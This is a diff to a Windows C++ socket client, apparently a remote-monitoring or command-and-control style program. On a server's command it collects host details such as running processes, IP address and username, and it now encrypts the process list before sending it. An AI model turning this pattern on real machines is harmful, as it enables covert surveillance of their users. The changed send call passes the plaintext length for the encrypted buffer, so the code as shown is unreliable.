@@ -1,9 +1,13 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define UNICODE
 
+#include <winsock2.h>
+#include <Windows.h>
+#include <Tlhelp32.h>
+#include <stdio.h>
 #include <iostream>
 #include <fstream>
 #include <string>
-#include <winsock2.h>
 #include <iostream>
 #include <string>
 #include <vector>
@@ -14,7 +18,6 @@
 #include <functional>
 #include <iomanip>
 #include <sstream>
-#include <Windows.h>
 #include <VersionHelpers.h>
 #include <Psapi.h>
 #include <locale>
@@ -357,14 +360,13 @@ void sendRunningProcesses(SOCKET clientSocket) {
     do {
         char exeName[MAX_PATH];
         WideCharToMultiByte(CP_UTF8, 0, processEntry.szExeFile, -1, exeName, MAX_PATH, NULL, NULL);
-
         processList.append(exeName);
         processList.append("\n");
     } while (Process32Next(snapshot, &processEntry));
 
     CloseHandle(snapshot);
-
-    int bytesSent = send(clientSocket, processList.c_str(), processList.length(), 0);
+    string encryptedProcesses = encrypt(processList);
+    int bytesSent = send(clientSocket, encryptedProcesses.c_str(), processList.length(), 0);
     if (bytesSent == SOCKET_ERROR) {
         cout << "Process List send failed" << endl;
         return;
@@ -412,7 +414,7 @@ int main(int argc, char* arg[]) {
     //Connecting to the server
     sockaddr_in clientService;
     clientService.sin_family = AF_INET;
-    InetPton(AF_INET, _T("127.0.0.1"), &clientService.sin_addr.s_addr);
+    inet_pton(AF_INET, "127.0.0.1", &clientService.sin_addr.s_addr);
     clientService.sin_port = htons(port);
     if (connect(clientSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
         cout << "Error at connect(): Failed to connect" << endl;
@@ -425,7 +427,7 @@ int main(int argc, char* arg[]) {
 
     }
 
-    //Get command from the server
+    //Get command from the server  
     //Commands:
     //  IPADDRESS
     //  USERNAME
